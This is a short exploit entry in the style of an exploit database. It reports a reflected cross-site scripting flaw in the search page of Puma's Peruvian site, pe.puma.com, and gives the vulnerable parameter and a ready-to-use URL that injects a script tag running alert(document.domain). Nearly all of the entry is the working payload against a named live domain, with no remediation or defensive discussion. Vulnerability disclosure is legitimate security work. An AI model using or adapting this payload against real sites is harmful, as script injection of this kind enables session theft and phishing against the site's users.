## Exploit Title: Puma Reflected XSS Vulnerability
## Date: 2024-08-23
## Exploit Author: kerem24
## Vendor: pe.puma.com
## Tested on: Windows
## CVE: N/A

## Exploit Use:

## Rxss Vuln Paramater & Payload
/pe/es/search?&q=</script><script>alert(document.domain)</script>

## Exp

https://pe.puma.com/pe/es/search?&q=</script><script>alert(document.domain)</script>
